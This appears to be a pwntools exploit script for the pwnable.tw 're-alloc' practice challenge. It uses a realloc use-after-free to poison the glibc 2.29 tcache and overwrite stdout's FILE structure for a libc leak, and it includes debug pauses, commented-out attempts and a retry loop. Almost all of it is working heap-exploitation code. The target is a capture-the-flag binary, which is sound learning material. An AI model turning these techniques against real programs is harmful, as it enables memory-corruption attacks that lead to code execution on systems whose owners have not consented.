from pwn import *

while True:
    context.arch="amd64"
    l = ELF("libc.so") #libc-2.29
    r = process("./re-alloc", env={"LD_PRELOAD":"./libc-2.29.so"})
    #r = remote("chall.pwnable.tw", 10302)
    

    def alloc(idx, size, data):
        r.sendlineafter(": ", "1")
        r.sendlineafter(":", str(idx))
        r.sendlineafter(":", str(size))
        r.sendafter(":", data)

    def realloc(idx, size, data): ## edit with resize
        r.sendlineafter(": ", "2")
        r.sendlineafter(":", str(idx))
        r.sendlineafter(":", str(size))
        r.sendafter(":", data)

    def free(idx):
        r.sendlineafter(": ", "3")
        r.sendlineafter(":", str(idx))

    def exit():
        r.sendlineafter(": ", "4")

    try:

        '''
        alloc(0, 0x70, "a"*0x70)
        realloc(0, 0x30, "b"*0x30) # free 1
        realloc(0, 0x70, "c"*0x70) # free 2
        realloc(0, 0x30, "d"*0x30) # free 3
        realloc(0, 0x70, "e"*0x70) # free 4
        realloc(0, 0x30, "f"*0x30) # free 5
        realloc(0, 0x70, "g"*0x70) # free 6
        realloc(0, 0x30, "h"*0x30) # free 7
        realloc(0, 0x70, "i"*0x70) # free 8
        realloc(0, 0x30, "j"*0x30) # free 9
        realloc(0, 0x70, "k"*0x70) # free 10
        realloc(0, 0x30, "l"*0x30) # free 11
        input("@")c
        '''
        alloc(0, 0x58, p64(0xdeadbeef)*10)
        free(0)

        alloc(0, 0x78, "a"*0x78)
        ### Use after free
        r.sendlineafter(": ", "2")
        r.sendlineafter(":", "0") ## idx
        r.sendlineafter(":", "0") ## size

        ### Overwrite fd  
        realloc(0, 0x8, "b"*0x8) 
        #input("123@")
        realloc(0, 0x68, "c"*0x68)
        #input("@")
        free(0)
        input("@")

        
        alloc(0, 0x78, b"d"*0x18 + p64(0xa1) + b"\x10")#p64(0x4040b0)) ### where to write
        input("@")
        free(0)
        alloc(0, 0x58, "e"*0x28) ### let tcache get the fake chunk addr
        input("@")
        alloc(1, 0x58, p64(0x0707010002000200) + p64(0x0707070707070707)*7 + p64(0x4040d0)) ### overwrite tcache(0x21 chunk) -> 0x4040d0 
        input("@")        
        free(0)
        
        ### Use after free
        r.sendlineafter(": ", "2")
        r.sendlineafter(":", "0") ## idx
        r.sendlineafter(":", "0") ## size
        
        
        realloc(1, 0x58, p64(0x0707070707070707)*8 + p64(0x4040d0)*3) ## leak = libc + 0x1bfca0
        
        realloc(1, 0x78, p64(0x0707070707070707)*8 + p64(0x4040d0)*4 + b"\x60\x07")
        

        IO_stdout = l.symbols[b'_IO_2_1_stdout_']
        print(f'IO_stdout: {hex(IO_stdout)}')
        alloc(0, 0x58, p64(0xfbad1800) + p64(0)*3 + b"\x80")
        
        input("@")
        
        
        '''
        alloc(0, 0x78, b"d"*0x18 + p64(0x61) + p64(0x4040a8)) ### 0x404090-0x3 where to write
        
        #input("@")
        free(0)
        alloc(0, 0x58, "e"*0x28) ### let tcache get the fake chunk addr
        #input("@")
        alloc(1, 0x58, p64(0x61) + p64(0x0) + p64(0x40401d) + p64(0) + p64(0x61)) ### overwrite "e"*0x8 at 0x4040c0


        #input("@")
        alloc(0, 0x78, "1"*0x78)
        ### Use after free
        r.sendlineafter(": ", "2")
        r.sendlineafter(":", "0") ## idx
        r.sendlineafter(":", "0") ## size

        ### Overwrite fd  
        realloc(0, 0x28, "2"*0x8)
        r.interactive() 
        input("@")
        realloc(0, 0x68, "3"*0x68)
        free(0)
        alloc(0, 0x78, b"4"*0x28 + p64(0x51) + p64(0x4040e0))
        free(0)
        alloc(0, 0x58, "5"*0x28)
        alloc(0, 0x58, "6"*0x20)
        '''

        r.interactive()
        break
    
    except:
        print("fail gg")
        r.close()